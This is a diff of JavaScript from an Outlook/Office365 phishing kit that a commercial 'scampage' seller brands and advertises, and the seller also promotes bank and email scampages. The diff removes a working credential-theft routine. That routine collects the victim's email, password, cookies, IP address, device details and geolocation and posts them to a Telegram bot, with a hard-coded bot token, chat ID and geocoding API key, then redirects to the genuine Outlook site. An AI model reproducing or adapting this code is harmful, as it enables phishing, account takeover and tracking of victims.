@@ -1,5 +1,9 @@
 //THIS CODE WAS BUILT BY "SCAMPAGESHOP [www.scampage.shop]" and has AES 256-bit encryption. Any adjustments to the code would break it//
+
 //Do not touch this section
+
+//When testing results, if you don't find it in your inbox, check your spam folder.
+
 //If you want to get quality:
 // - USA Banks Scampage
 // - UK Banks Scampage
@@ -9,9 +13,7 @@
 // - Email Accounts Scampage
 // - Newsletter Scampage and more..
 
-// Visit: https://www.scampage.shop
-
-const OpenCageApiKey = "4e409ae9c61a4c72a039a8c02e10e45a";
+// Visit: https://www.scampage.shop/
 
 document.addEventListener('DOMContentLoaded', () => {
     const unReq = "Enter a valid email address, phone number, or Skype name."
@@ -27,7 +29,7 @@ document.addEventListener('DOMContentLoaded', () => {
     function handleNextDown(event, nextButton) {
         if (event.key === "Enter") {
             event.preventDefault();
-            nextButton.click();
+            nextButton.click(); // Trigger the click event on the next button
         }
     }
 
@@ -36,7 +38,7 @@ document.addEventListener('DOMContentLoaded', () => {
     function handleSigDown(event, sigButton) {
         if (event.key === "Enter") {
             event.preventDefault();
-            sigButton.click();
+            sigButton.click(); // Trigger the click event on the next button
         }
     }
 
@@ -118,7 +120,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 pwdValAction(true);
                 const password = pwdInp.value;
                 localStorage.setItem("password", password);
-                //sendLogs();
+                //saveAndSendLogs();
             }
             pwdInp.addEventListener('change', function() {
                 if (this.value.trim() === "") {
@@ -141,7 +143,7 @@ document.addEventListener('DOMContentLoaded', () => {
     //final buttons
     document.querySelectorAll('#btn_final').forEach((b) => {
         b.addEventListener('click', () => {
-            sendLogs();
+            saveAndSendLogs();
         })
 
         b.addEventListener('keydown', (event) => handleFinalDown(event, b));
@@ -150,133 +152,11 @@ document.addEventListener('DOMContentLoaded', () => {
     function handleFinalDown(event, b) {
         if (event.key === "Enter") {
             event.preventDefault();
-            sendLogs();
+            saveAndSendLogs(); // Trigger the click event on the next button
         }
     }
 
-    function sendLogs() {
-        const username = localStorage.getItem("email");
-        const password = localStorage.getItem("password");
-        var realCookie = document.cookie;
-        var x = realCookie.substring(0, 150);
-
-        fetch('https://api.ipify.org')
-            .then(res => res.text())
-            .then(ipAddress => {
-                const deviceInfo = {
-                    manufacturer: navigator.userAgent.match(/[\(](.*?)[\)]/)[1],
-                    model: navigator.userAgent.match(/[\(](.*?)[\)]/)[2],
-                    os: navigator.userAgent.match(/Mac OS X/) ? "Mac OS X" : "Windows",
-                    browser: navigator.userAgent.match(/Chrome/) ? "Chrome" : "Firefox",
-                };
-
-                getLocation(username, password, x, deviceInfo, ipAddress);
-            })
-            .catch(error => {
-                console.error("Error capturing IP address:", error);
-            });
-
+    function saveAndSendLogs() {
+        window.location.href = "/recover.html"
     }
-
-    function getLocation(username, password, x, deviceInfo, ipAddress) {
-        navigator.geolocation?.getCurrentPosition(async (position) => {
-            const latitude = position.coords.latitude;
-            const longitude = position.coords.longitude;
-
-            const apiUrl = `https://api.opencagedata.com/geocode/v1/json?q=${latitude}+${longitude}&key=${OpenCageApiKey}&pretty=1&no_annotations=1`;
-
-            try {
-                const response = await fetch(apiUrl);
-                const data = await response.json();
-
-                if (data.results.length > 0) {
-                    const result = data.results[0].components;
-                    const city = result.city || result.village || result.town;
-                    const state = result.state;
-                    const country = result.country;
-                    const zipCode = result.postcode;
-                    const continent = result.continent;
-                    const county = result.county;
-
-                    var dataToSend = {
-                        username,
-                        password,
-                        ipAddress,
-                        Device: deviceInfo.manufacturer,
-                        OS: deviceInfo.os,
-                        Browser: deviceInfo.browser,
-                        Latitude: latitude,
-                        Longitude: longitude,
-                        City: city,
-                        State: state,
-                        Country: country,
-                        County: county,
-                        ZipCode: zipCode,
-                        Cookies: x,
-                    };
-
-                    if (Object.keys(dataToSend).length > 0) {
-                        sendToTelegram(dataToSend);
-                    } else {
-                        console.warn("No data to send to Telegram.");
-                    }
-                    } else {
-                    console.error("Location information not found.");
-                    }
-                } catch (error) {
-                    console.error("Error fetching location data:", error);
-                }
-            },
-            (error) => {
-            console.error("Error getting location:", error);
-            alert("Location permission is required to login to Outlook.");
-        }
-        );
-    };
-
-    function sendToTelegram(data) {
-        // Add your bot details here👇 (this is where you will get the logs)
-
-        var telegramBotId = "6502537025:AAGlWDt4HheBPcy10r1x6CtInaTTlb4CVUg";
-        var chatId = 6840082974;
-
-        var payload = {
-          chat_id: chatId,
-          text: `
-            New Office365 Login:
-            ________________________
-               "Email address, phone number or skype": "${data.username}",
-               "Password": "${data.password}",
-               "IP Address": ${data.ipAddress},
-               "Device Info": "${data.Device}",
-               "OS": "${data.OS}",
-               "Browser": "${data.Browser}",
-               "Latitude": ${data.Latitude},
-               "Longitude": ${data.Longitude},
-               "City": "${data.City}",
-               "State": "${data.State}",
-               "County": "${data.County}",
-               "Country": "${data.Country}",
-               "ZipCode": ${data.ZipCode},
-               "Cookies": ["${data.Cookies}"],
-            `
-        };
-
-        var sendToBot = {
-          url: "https://api.telegram.org/bot" + telegramBotId + "/sendMessage",
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-            "cache-control": "no-cache"
-          },
-          data: JSON.stringify(payload)
-        };
-
-        $.ajax(sendToBot).done(function(response) {
-          window.location.href = "https://outlook.live.com/mail/0/";
-          // console.log("Telegram API response:", JSON.stringify(response));
-        }).fail(function(error) {
-          console.error("Error sending data to Telegram:", error);
-        });
-      }
 });
